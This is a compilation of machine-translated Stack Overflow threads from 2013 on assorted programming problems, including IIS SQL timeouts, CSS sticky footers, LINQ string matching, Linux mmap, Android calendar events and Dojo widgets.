我有一个 IIS Web 服务器，它托管 400 个 Web 应用程序（分布在 30 个应用程序池中）。它们都是 ASP.NET 应用程序和 WCF 服务端点。服务器有 32GB 的 RAM，通常运行速度很快；尽管它以 95% 的内存使用率运行。每个工作进程占用 500MB 到 1.5GB 的 RAM。

我还有另一个运行 SQL Server 的机器。那个有足够的可用内存。

有时，Web 服务器开始抛出*SQL 超时异常*。起初每分钟几个，然后迅速增加到每分钟数百个；有效地使服务器停机。此问题会影响所有池中的应用程序。一些请求仍然完成，但大多数没有完成。虽然发生这种情况，但服务器上的 CPU 使用率约为 30%（这是该机器上的正常负载）。

虽然发生这种情况，但我们仍然可以使用 SQL Server Management Studio（来自 IIS 服务器）成功（并且快速）执行请求。

解决方法是重新启动 IIS。然后一切都恢复正常，直到下一次。

因为服务器以非常低的内存运行，我觉得这就是原因。但是我无法解释低内存和突然爆发的 SQL Timeout 异常之间的关系。

任何想法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-18T17:47:13.417

内存压力可以触发**分页和垃圾收集**。两者都会引入延迟，否则不会出现。

GC 处理 32GB 的数据可能需要几秒钟。为什么所有应用程序会同时处理 GC？因为在大约 95% 的内存利用率时，Windows 设置了 CLR 侦听的“**内存不足**”事件。它将尝试释放内存以帮助其他进程。

如果应用程序陷入分页狂热，这也将解释正常执行中的巨大延迟。

不过，这只是猜测。您可以尝试通过查看“Hard page faults/sec”计数器来**证明这一点。**还必须有一个用于“full GC”或“Gen 2 GC”的计数器。

该**修复程序**将以更高的物理内存限制运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-18T17:55:04.040

第一个问题是发现超时发生的位置。您能否从堆栈跟踪中判断超时是在对数据库*执行*请求时发生，还是在*连接*到数据库时发生？（或者甚至连接到*网络服务器*？）

执行数据库请求的超时可能有多种原因。问题可能出在具有阻塞进程、数据库维护（也包括锁定）、死锁等的数据库中。当应用程序运行缓慢时，您是否在[sys.dm_exec_requests](http://msdn.microsoft.com/en-us/library/ms177648.aspx)中看到很多条目，如果是，它们的 wait_types 是什么？

即使您可以在 Web 服务器超时时在查询窗口中运行 SQL，但这并不意味着不会发生大规模阻塞或死锁。

如果*连接*到数据库超时，则可能是 ADO 连接池不堪重负而没有清理干净，或者数据库有连接限制，并且 Web 服务在等待连接时超时。

找出正在发生的事情的最佳方法之一是捕获 w3wp.exe 进程的内存转储并对其进行分析。即使您不擅长像[WinDbg](http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx)这样的调试器，[Microsoft 的 DebugDiag 工具](http://www.microsoft.com/en-us/download/details.aspx?id=26798)也可以生成一些带有有用信息的漂亮报告。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T22:14:02.280

[SqlCommand.CommandTimeout](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.commandtimeout.aspx)

此属性是命令执行或结果处理期间所有网络读取的累积超时。返回第一行后仍然可能发生超时，并且不包括用户处理时间，仅包括网络读取时间。

这是基于客户端的超时。如果东西由于内存限制而排队，那么这可能会导致超时。

您是否从这些查询中检索了大量数据？

如果某些查询返回大量数据，请考虑将它们分解并为用户提供下一个和前一个按钮。

您是否考虑过像 BeginExecuteReader 这样的异步？
优点是没有超时。
它不会释放调用线程。

```
isExecutingFTSindexWordOnce = true;
sqlCmdFTSindexWordOnce.BeginExecuteNonQuery(callbackFTSindexWordOnce, sqlCmdFTSindexWordOnce);
// isExecutingFTSindexWordOnce set to false in the callback
Debug.WriteLine("Calling thread active"); 
```

但我同意你的评论如何回应请求，因为答案不会回到调用线程。
抱歉，我习惯了 WPF，我只是在回调中更新公共属性。

# css - 如何添加始终显示在页面底部的页脚

> ID：14346958
> 
> 赞同：1
> 
> 时间：2013-01-15T21:08:55.047
> 
> 标签：css

我正在寻找一种方法来为我的页面添加页脚，该页脚将始终显示在底部。问题是，页面上的很多内容都是通过 设置的`position: absolute;`，所以目前，除非我手动给页脚一个`margin-top: 900px;`值，否则它只是被绝对定位的内容之一隐藏。但是在一些内容小于 900px 的页面上，页面末尾和页脚之间的底部有一个不必要的间隙。

我该如何解决这个问题，以使内容结尾和页脚之间没有间隙？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:14:03.047

在新的 jquery 中，你可以使用这个：

```
<div data-role="footer" data-position="fixed">
<h1>Fixed Footer!</h1>
</div> 
```

来自[http://jquerymobile.com/demos/1.2.0/docs/toolbars/bars-fixed.html](http://jquerymobile.com/demos/1.2.0/docs/toolbars/bars-fixed.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T21:15:23.333

将页脚之前的所有内容放在具有相对位置的 div 中。该 div 将垂直于其中的内容弯曲，并提供缓冲区以将其后的任何内容保留在其正下方。不需要保证金。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T21:53:46.923

你也可以放索引。z-index：1；

[http://www.fiveminuteargument.com/fixed-position-z-index](http://www.fiveminuteargument.com/fixed-position-z-index)

在您的情况下，将 z-index 放在 css 中以获取 10 或更多的页脚。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T21:14:24.833

让我们假设一个, 用and设置`<footer>`样式。`display: block``height: 250px`

所以你所要做的就是添加：

```
position: fixed;
top: 100%;
margin-top: -250px; 
```

*而已。它将在底部永久对齐。*:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T21:15:26.400

粘性页脚。无需 javascript：

[http://www.cssstickyfooter.com/](http://www.cssstickyfooter.com/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-20T20:23:20.397

在做了一些摆弄之后，我被提醒绝对定位会从文档流中删除元素。您不能依赖绝对定位元素来影响其他元素，因为它不会。因为您不知道内容的高度，所以使用 margin-top 显然不是选项。

所以我想出了这个：基本上用浮动做一个正常的布局，然后使用相对位置将项目移动到你想要的位置。这样，元素仍然会影响文档流，但是，现在您可以完全控制位置。这正是相对定位的用途：您希望完全控制元素的位置，但仍希望它们的元素正常影响布局。

```
<html>

<head>

<style>

body {
    text-align:center;
}
#container {
    position:relative;
    margin:0 auto;
    width: 1000px;
    text-align:left;
}
#header {
    position:relative;
    top:0px;
    left:0px;
    width:1000px;
    height: 100px;
    border:solid 1px #000;
}
#sidebar {
    position:relative;
    top:10px;
    left:0px;
    width:300px;
    height: 500px; /* for demo */
    float:left;
    margin-bottom: 20px;
    border:solid 1px #000;
}
#main {
    position:relative;
    top:10px;
    left:310px;
    width:690px;
    height: 200px; /* for demo */
    margin-bottom:20px;
    border:solid 1px #000;
}
#footer {
    margin:0 auto;
    top:20px;
    width: 1000px;
    text-align:left;
    height: 100px;
    clear:both;
    border:solid 1px #000;
}
</style>
</head>
<body>

<div id="container"> <!-- Holds all the content except the footer -->

<div id="header">Header content here</div>
<div id="sidebar">Sidebar content here</div>
<div id="main">Main content here</div>

</div>

<div id="footer">Footer content here</div>

</body>

</html> 
```

# c# - LinQ WHERE string.Contains 还是 string.IndexOf？

> ID：14346961
> 
> 赞同：5
> 
> 时间：2013-01-15T21:09:02.787
> 
> 标签：c#, .net, linq

我需要写一些与以下结果相同的东西：

```
var result = collection.Where( o => o.Name.IndexOf( "some_string2" ) != -1 || o.Name.IndexOf( "some_string_2" ) != -1 || o.Name.IndexOf( "some_string3" ) != -1 ) 
```

要检查的字符串的数量和值（some_string_1、2 和 3）是未知的（来自 DB），所以更通用的...

我尝试了以下方法，但失败了......

```
var stringsToCheck = someCommaSeparatedStrings.ToLower().Split( ',' ).ToList();
var result = collection.Where( o => stringsToCheck.Contains( o.ToLower() ) ); 
```

换句话说，我需要从名称包含某些特定字符串的集合中检索所有对象。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-01-15T21:13:07.537

```
var result = collection.Where(item => stringsToCheck.Any(stringToCheck => 
    item.Name.Contains(stringToCheck))); 
```

用英文阅读是：给我集合中的所有项目，在所有要检查的字符串中，其中一个是集合中字符串的子字符串。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-15T21:37:07.263

如果要测试是否`o.Name`包含a，`stringToCheck`则：

```
var result = collection.Where( o => stringsToCheck.Any(a => o.Name.Contains(a))); 
```

如果您只需要测试是否相等，那么：

```
var result = collection.Where( o => stringsToCheck.Contains(o.Name)); 
```

注意：如果您需要应用案例规范化，`ToLower()`则应相应地应用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T21:14:00.303

`o.ToLower()`您正在检查我假设您必须检查其名称的集合元素`o.Name.ToLower()`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T21:26:21.010

如果您想检查是否`o.Name`包含`string`来自 的某些内容`stringsToCheck`，我建议使用[LinqKit](http://www.albahari.com/nutshell/linqkit.aspx)并使用`PredicateBuilder`.

```
var predicate = PredicateBuilder.False<TypeOfYourObject>();
var stringsToCheck = someCommaSeparatedStrings.ToLower().Split( ',' ).ToList();

foreach(var str in stringsToCheck)
{
     var tmp = str; 
     predicate = predicate.Or(o=> o.Name.IndexOf(tmp) != -1);
} 
resultQuery = collection.Where(predicate); 
```

# objective-c - 有没有办法让 AFNetworking 返回你的回调而不阻塞？

> ID：14346970
> 
> 赞同：0
> 
> 时间：2013-01-15T21:09:21.863
> 
> 标签：objective-c, objective-c-blocks, afnetworking

我正在使用[AFNetworking](https://github.com/AFNetworking/AFNetworking/tree/0.10.x)库，它使用块来处理您的结果，如下所示：

```
[httpClient HTTPRequestOperationWithRequest:request success:^(AFHTTPRequestOperation *op, id response) {
    //success clock
} failure:^(AFHTTPRequestOperation *operation, NSError *error) {
    //error block
}] 
```

有没有代码块的使用方法？例如使用委托？如下所示：

```
[httpClient HTTPRequestOperationWithRequest:request delegate:self] 
```

并在自课中：

```
-(void)afhttpSuccess:(AFHTTPRequestOperation*)op Response:(id)response {
    //success method
}
-(void)afhttpError:(AFHTTPRequestOperation*)op Response:(NSError*)error {
    //error method
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T21:59:46.247

不知道为什么委托 + 选择器范式更可取，但我制作了[这个库，它简化了从具有该模式的 ASI 的过渡](https://github.com/AFNetworking/AFNetworking-ASIHTTPRequest)。

或者，您始终可以在成功/失败回调中调用成功/失败方法。

# javascript - HTML 表单提交和重定向相结合

> ID：14346972
> 
> 赞同：0
> 
> 时间：2013-01-15T21:09:34.983
> 
> 标签：javascript, html

我正在一个网站上工作，用户填写表格并使用发送 POST 的按钮提交。我希望用户提交 POST 并在同一操作中重定向。目前我已经实现了一个 javascript 重定向（带有`window.location`），但我希望页面能够更好地压缩。同一元素是否有一种简单的方法可以发送 POST 并随后将 GET 发送到不同的地址？如果这不是很明显，我是 Web 开发的新手，如果我的术语不正确，我深表歉意。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:10:41.907

只需将表单的`action`属性设置为您要处理表单的 URL。

您不能在一个操作中“提交到一个 URL 并重定向到另一个”。

您的选择是：

*   从第一个 URL 重定向到第二个 URL
*   使用 AJAX 发布第一个 URL 并在 JavaScript 中重定向到第二个

# linux - linux - 映射文件的非线性部分

> ID：14346979
> 
> 赞同：3
> 
> 时间：2013-01-15T21:09:57.120
> 
> 标签：linux, mmap, file-mapping

我有一个场景，我需要在进程空间中线性映射文件的非线性部分。

例如，如果文件是10页，我可能需要映射前3页，跳过4页，最后3页。映射应该是线性的，进程空间中的st增量访问允许在第3页之后转到文件的第8页，作为页4、5、6 和 7 未映射。

我想知道这在 Linux 中是否可行。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T22:03:19.710

`mmap()`多次调用`MAP_FIXED`以指定第二个和后续映射的固定地址的策略应该可以工作，但问题是如果在第一次映射之后立即有任何东西已经映射到内存中，它将被破坏，因为`MAP_FIXED`自动取消映射任何东西在制作新映射之前曾经在那里。

我在这里查看了 Linux 系统上地址空间中一些映射的布局，我观察到，至少在某些时候，内核为内存映射选择的地址从高地址向下增长到低地址地址。即，在最近的现有映射所使用的地址空间之下的地址空间被赋予一个新的映射。在该策略下，当您进行第一次映射时，几乎可以保证紧随该映射的地址空间已经被其他东西占用（并且它可能也很重要，例如系统库）。其他系统（不同的内核版本、不同的体系结构或非 Linux 等）可能使用不同的地址空间分配策略，这不会使这个问题不太可能发生，

1.  首先创建一个虚拟映射，它是您要构建的所有映射的大小之和。因此，如果要映射文件的前 3 页，则跳过 4 页，然后再映射 3 页，进行 6 页的虚拟映射。

    对于这个虚拟映射，您可以只映射匿名内存 ( `MAP_ANONYMOUS`)。感谢[Basile Starynkevitch](https://stackoverflow.com/users/841108/basile-starynkevitch)提出也`MAP_NORESERVE`用于此映射的建议。

2.  用您实际需要的文件的映射逐个替换此虚拟映射，`MAP_FIXED`用于指定您希望每个映射出现的精确地址。

    **编辑：**我最初建议在重用地址空间进行新映射之前破坏虚拟`munmap()`映射，但感谢[jstine](https://stackoverflow.com/users/786437/jstine)指出这是不必要的（如果您的程序是多线程的，它会引入竞争条件）。

    对于第一个映射，使用虚拟映射的起始地址。计算第二个映射的地址为虚拟映射的起始地址加上第一个映射的大小。这应该将第二个映射放在第一个映射结束之后。第三个和第四个映射依此类推。在您的方案中，所有内容都是页面大小和页面对齐的，因此不会因对齐而出现间隙。

在步骤 2 中完成所有映射后，原始虚拟映射应该没有任何剩余。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-16T05:53:14.733

In addition of [previous answer](https://stackoverflow.com/a/14347758/841108) by Celada, you might also be interested by the Linux specific [remap_file_pages(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/remap_file_pages.2.html) syscall after your [mmap(2)](http://www.kernel.org/doc/man-pages/online/pages/man2/mmap.2.html).

And the first `mmap` might use `MAP_NORESERVE` to avoid spending swap space (and just reserve the address space, not the data).

# jquery - jquery深度链接，前进和后退按钮

> ID：14346981
> 
> 赞同：0
> 
> 时间：2013-01-15T21:10:01.977
> 
> 标签：jquery, deep-linking

我为我的网站设置了一个深度链接，除了前进和后退按钮外，它都可以工作，我有点不确定如何更新我所做的事情。网址会更改，但内容不会更改，除非您点击刷新。

这是它工作的一个例子：[http ://www.klossal.com/index2.html#color_dance](http://www.klossal.com/index2.html#color_dance)

这是代码：

```
 // taked anchor from browser i.e '#bow' , '#bow-003'
        var id = window.location.hash;

        // check is it valid anchor
        if (id.match("#") != null | id.match("#undefined") != null) {

                $(id).ready(function () {
                    $(id).trigger("click");
                });
            }
        $(".iso").click(function () {
            window.location.hash = $(this).attr("id");
        }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T00:55:15.577

$(window).on('hashchange',function() { var id = window.location.hash;

```
 // check is it valid anchor
    if (id.match("#") != null | id.match("#undefined") != null) {

            $(id).ready(function () {
                $(id).trigger("click");
            });
        } 
```

});

# android - 如何通过 ID 添加日历事件并通过 ID 删除？(安卓 4.0)

> ID：14346985
> 
> 赞同：1
> 
> 时间：2013-01-15T21:10:13.110
> 
> 标签：android, calendar

使用此代码，我的队友正在添加日历事件。这没有问题。日历事件显示在谷歌日历中。

```
 TimeZone timeZone = TimeZone.getDefault();
        ContentResolver cr = getContentResolver();
        ContentValues values = new ContentValues();
        values.put(CalendarContract.Events.EVENT_TIMEZONE, timeZone.getID());
        values.put(CalendarContract.Events.DTSTART, startInMillis);
        values.put(CalendarContract.Events.DTEND, endInMillis);
        values.put(CalendarContract.Events.TITLE, title);
        values.put(CalendarContract.Events.EVENT_LOCATION, "Raum: " + location);
        values.put(CalendarContract.Events.DESCRIPTION,
                "Dauer der Veranstaltung: " + duration + " min" + "---|---Dozent: "
                        + organizer.trim() + "---|---Course added by UNIDATE---|");
        values.put(CalendarContract.Events.CALENDAR_ID, 1);
        Uri uri = cr.insert(CalendarContract.Events.CONTENT_URI, values);
        ContentUris.withAppendedId(uri, id); 
```

但现在我想通过他们的 id 删除这些事件。我用过这段代码（除其他外）：

```
long selectedEventId = 1;
String[] selArgs = new String[]{Long.toString(selectedEventId)};
int deleted = getContentResolver().delete(CalendarContract.Events.CONTENT_URI, Events._ID + " =? ", selArgs); 
```

这行不通。我也尝试添加

```
values.put(CalendarContract.Events._ID, id); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-04-06T10:07:49.103

一个简单的解决方案是首先清除日历事件，然后添加相关事件。

清除日历事件可以通过调用这个来完成：

```
context.getContentResolver().delete(CalendarContract.Events.CONTENT_URI, CalendarContract.Events.CALENDAR_ID + " = ?", new String[]{String.valueOf(calendarId)}); 
```

# android - ActionBarSherlock 选项卡和菜单项

> ID：14346990
> 
> 赞同：0
> 
> 时间：2013-01-15T21:10:26.670
> 
> 标签：android, android-actionbar, actionbarsherlock

我一直在学习操作栏，我希望顶部菜单有 Tabs + One Refresh 按钮。所以，我尝试用一​​个按钮制作一个简单的菜单：

```
@Override
public boolean onCreateOptionsMenu(Menu menu) {
    menu.add("Refresh")
    .setIcon(R.drawable.abs__ic_search_api_holo_light)
    .setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);

    return true;
} 
```

并添加标签：

```
mViewPager = new ViewPager(this);
mViewPager.setId(R.id.pager);

setContentView(mViewPager);
ActionBar bar = getSupportActionBar();
bar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);
bar.setDisplayShowTitleEnabled(false);
bar.setDisplayShowHomeEnabled(false);

mTabsAdapter = new TabsAdapter(this, mViewPager);
mTabsAdapter.addTab(bar.newTab().setText("Grades"), FragmentOne.class, null); // many more tabs in same format 
```

但是问题是当应用程序处于纵向模式时，菜单栏会转到下面的级别。在横向模式下，它更容易接受，但是它将它们分组到下拉列表中。我已阅读 Android 的[ActionBar](http://developer.android.com/guide/topics/ui/actionbar.html)但找不到解决方案。这是什么解决方法？我只希望选项卡可以左右滚动，并在右侧刷新按钮静态。我是否需要进行布局并以某种方式对其进行充气？

![人像模式](../Images/7326ffd59e082dc5ffd50aaa5456d6e2.png) ![横向模式](../Images/c789f6044b157160b23c5584e2a93d3c.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T22:29:47.097

这是一个已知错误，请参阅此对话：[https ://groups.google.com/forum/#!topic/actionbarsherlock/wYuKJUdO1vs/discussion](https://groups.google.com/forum/#!topic/actionbarsherlock/wYuKJUdO1vs/discussion)

Jake Wharton 本人也提供了反馈和一些解决方法，但我认为它不会对您有很大帮助（因为您需要标签，而不是微调器）。

此解决方案可能对您更有帮助：[https ://stackoverflow.com/a/13828869/1140682](https://stackoverflow.com/a/13828869/1140682)

# c# - 创建设置文件并让用户选择保存数据库的位置

> ID：14346994
> 
> 赞同：0
> 
> 时间：2013-01-15T21:10:45.870
> 
> 标签：c#, sql-server, database, winforms

用很短的话，我创建了一个包含使用 sql server 的数据库的项目；当然，我希望将数据库分开或在远离驱动器 C 的某个地方，所以我想让用户在安装程序时选择在哪里保存他的数据库，以便在必要时能够移动它，而不是丢失所有数据时间，因为员工没有受过良好的计算机培训，或者如果可能的话，使整个程序可移植，有人可以帮助我或向我发送带有明确解释的链接，因为我无法提前找到有用的东西

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:29:37.817

使用动态创建数据库非常容易，`SQL Server Compact Edition (SQL CE)`它是一个紧凑的关系数据库，非常容易从您的应用程序动态配置和部署。对于您描述的环境，这听起来像是一个可行的解决方案。我没有回收代码，而是为您找到了一些很好的初学者资源：

1.  [SQL Server Compact Edition 入门](http://arcanecode.com/2007/01/22/getting-started-with-sql-server-compact-edition/)
2.  [创建 SQL Server Compact Edition 数据库](http://arcanecode.com/2007/01/25/create-a-sql-server-compact-edition-database-with-c/)
3.  [在 SQL Server Compact Edition 中创建表](http://arcanecode.com/2007/01/26/create-a-table-in-sql-server-compact-edition-with-c/)

# sql-server - 带有 groupby 的子查询并具有

> ID：14346997
> 
> 赞同：0
> 
> 时间：2013-01-15T21:11:00.803
> 
> 标签：sql-server

嘿伙计们，我对这个有点难过。这是声明。我正在寻找在过去 6 个月内进行过 3 次以上就诊的患者。我虽然这会给我更容易的遮阳篷。

```
SELECT od_ar_demographics.PATIENT_ARPTYPE, 
       od_ar_demographics.PATIENT_NAME, 
       od_ar_demographics.MR_NUMBER, 
       OD_IP1.IP1ADMIT_DATE, 
       OD_IP1.IP1DISC_DATE, 
       od_ar_demographics.PATIENT_TYPE
FROM            od_ar_demographics INNER JOIN
                         OD_IP1 ON od_ar_demographics.PATIENT_NUMBER = OD_IP1.IP0NUMBER
where         Mr_number in (select MR_number from (SELECT MR_number, 
 COUNT(MR_number) as LLL
FROM  od_ar_demographics INNER JOIN
                         OD_IP1 ON od_ar_demographics.PATIENT_NUMBER = OD_IP1.IP0NUMBER WHERE  IP1admit_date >(getdate()- 180 ) GROUP BY MR_number
HAVING ( COUNT(MR_number) > 3 )) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:21:25.600

试试这个，你的子查询需要别名

```
SELECT od_ar_demographics.PATIENT_ARPTYPE, 
       od_ar_demographics.PATIENT_NAME, 
       od_ar_demographics.MR_NUMBER, 
       OD_IP1.IP1ADMIT_DATE, 
       OD_IP1.IP1DISC_DATE, 
       od_ar_demographics.PATIENT_TYPE
FROM  od_ar_demographics 
INNER JOIN OD_IP1 
    ON od_ar_demographics.PATIENT_NUMBER = OD_IP1.IP0NUMBER
WHERE Mr_number IN (SELECT MR_number 
                    FROM (  
                            SELECT MR_number, COUNT(MR_number) as LLL
                            FROM  od_ar_demographics 
                            INNER JOIN OD_IP1 
                            ON od_ar_demographics.PATIENT_NUMBER = OD_IP1.IP0NUMBER 
                            WHERE  IP1admit_date > getdate()- 180
                            GROUP BY MR_number
                            HAVING COUNT(MR_number) > 3 
                          ) A
                    ) 
```

# javascript - 在调整窗口大小之前，Dojo stackContainer 不显示子项

> ID：14346998
> 
> 赞同：1
> 
> 时间：2013-01-15T21:11:09.833
> 
> 标签：javascript, dojo

这是我要创建的小部件。目标是让 stackContainer 由顶部的单选按钮控制。

我已经尝试过 dojo 文档中的示例，但它具有相同的错误行为。

```
define(["dojo/ready",  "dojo/_base/declare", "dijit/_WidgetBase", "dojo/dom-construct", 
        "dojo/_base/lang", "dojo/on", "dojo/dom-attr", "dijit/form/RadioButton", 
        "dojo/dom-style", "dijit/layout/ContentPane", "dijit/layout/StackContainer", 
        "tcs/Log"], 
function(ready, declare, _WidgetBase, domConstruct, 
         lang, on, attr, RadioButton, 
         style, ContentPane, StackContainer, 
         log) {

    /**
     * @class
     * @name gijit.workflow.debug.combi
     */
    return declare("gijit.workflow.debug.combi", [_WidgetBase], {
        workflow : null,
        panes : null,
        width : "600px",
        height : "400px",

        _beforeCall : function(d) {
            alert("beforeCall");
        },

        buildRendering : function() {
            this.domNode = domConstruct.create("div", {id:"myform"});
            var contain = domConstruct.create("div", null, this.domNode, "last");
            var stackContainer = new StackContainer({
                style: "height: " + this.height + "; width: " + this.width + "; border: 0px solid red"
            }, contain);
            var buttons = domConstruct.create("form", null, this.domNode, "first");
            for(var i=0; i<this.panes.length; i++){
                var contentPane = new ContentPane({
                    id : this.panes[i].title,
                    title : this.panes[i].title,
                    content : this.panes[i].content
                })
                stackContainer.addChild(contentPane);

                var buttonDiv = domConstruct.create("span", null, buttons, "last");
                style.set(buttonDiv, "display", "inline-block");
                style.set(buttonDiv, "margin", "10px");

                var label = domConstruct.create("div", {innerHTML: this.panes[i].title}, buttonDiv, "last");

                if(i==0){
                    var RButton = new RadioButton({
                        title : this.panes[i].title,
                        showTitle : true,
                        checked : true,
                        value : this.panes[i].title, 
                        name : "options",
                        onClick : function(a){stackContainer.selectChild(a.explicitOriginalTarget.attributes.value.textContent)}
                    }).placeAt(buttonDiv);
                } else {
                    var RButton = new RadioButton({
                        title : this.panes[i].title,
                        showTitle : true,
                        checked : false,
                        value : this.panes[i].title,
                        name : "options",
                        onClick : function(a){stackContainer.selectChild(a.explicitOriginalTarget.attributes.value.textContent)}
                    }).placeAt(buttonDiv);
                }
                contentPane.resize();
                contentPane.startup();
            }
            stackContainer.startup();
                    //Hacks in attempt to get the stuff to show
            for(var i=0; i<stackContainer.getChildren().length; i++){
                stackContainer.getChildren()[i].startup();
                stackContainer.getChildren()[i].resize();
                if(typeof stackContainer.getChildren()[i].getChildren()[0] === 'object'){
                    stackContainer.getChildren()[i].getChildren()[0].startup(); 
                }
            }
            stackContainer.resize();
        },
    });
}); 
```

在大多数情况下，它有效。但是为了显示任何东西，我必须调整窗口大小。所有的调整大小/启动调用都是在它最初不起作用之后添加的，但它们都没有做任何事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:30:13.683

如果您以编程方式将子小部件添加到小部件，则需要定义启动子小部件的启动函数。每当创建新实例并将其放置在 dom 中时，都应该调用该启动函数。例如：

```
require(["dojo/ready", "dojo/_base/declare", "dijit/_WidgetBase", "dojo/dom-construct",
  "dojo/_base/lang", "dojo/on", "dojo/dom-attr", "dijit/form/RadioButton",
  "dojo/dom-style", "dijit/layout/ContentPane", "dijit/layout/StackContainer"],

function (ready, declare, _WidgetBase, domConstruct,
lang, on, attr, RadioButton,
style, ContentPane, StackContainer) {

  var MyClass = declare("gijit.workflow.debug.combi", [_WidgetBase], {
    startup: function () {
      this.inherited(arguments);
      stackContainer.startup();
    }
  });
  var x = new MyClass({});
  x.placeAt('node');
//manually call startup after instantiating the widget.  If  the parser is what is creating your widget, it calls startup automatically.  startup must be called after the widget is in the dom.
  x.startup();
  console.log(x);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-08T18:33:40.033

使您的小部件子类成为**ContentPane**而不是 _WidgetBase 来解决这个问题，因为 ContentPanes 知道如何调整自己的大小

另请参阅[Dojo 中的子小部件不会渲染（高度为 0）](https://stackoverflow.com/questions/13642369/sub-widgets-wont-render-will-have-0-height-in-dojo)